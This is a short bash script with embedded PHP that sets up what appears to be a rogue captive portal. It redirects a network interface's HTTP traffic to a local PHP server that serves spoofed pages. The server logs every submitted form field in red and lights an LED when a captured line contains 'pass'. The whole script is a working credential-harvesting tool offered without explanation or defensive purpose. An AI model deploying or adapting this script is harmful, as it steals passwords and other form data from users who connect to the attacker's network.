#!/bin/bash

if ! iptables -t nat -vnL PREROUTING | grep "$1" | grep -q " 80"; then
	iptables -t nat -A PREROUTING -i "$1" -p tcp --dport 80 -j REDIRECT --to-port 80 
fi

cat <<E > /tmp/captive.php
<?php
\$root = str_getcsv(file_get_contents('/proc/self/cmdline'), "\0")[4];
\$script = str_replace('..', '', urldecode(\$_SERVER['SCRIPT_NAME'])); // safety
header('HTTP/1.1 200 OK');
header('Content-type: '); // disable Content-Type
if ( is_file(\$root . \$script) )
	echo file_get_contents(\$root . \$script);
else
	echo file_get_contents(\$root . "/index.html");

foreach(\$_POST as \$par=>\$val)
	error_log( "\x1b[31m" . "\$par: \$val" . "\x1b[0m" );
?>
E

php -S 0.0.0.0:80 /tmp/captive.php $(dirname $0)/www/current 2>&1 | while read line
do echo "$line"
	if echo "$line" | fgrep -i "pass"; then
		led red on 2> /dev/null
	fi
done
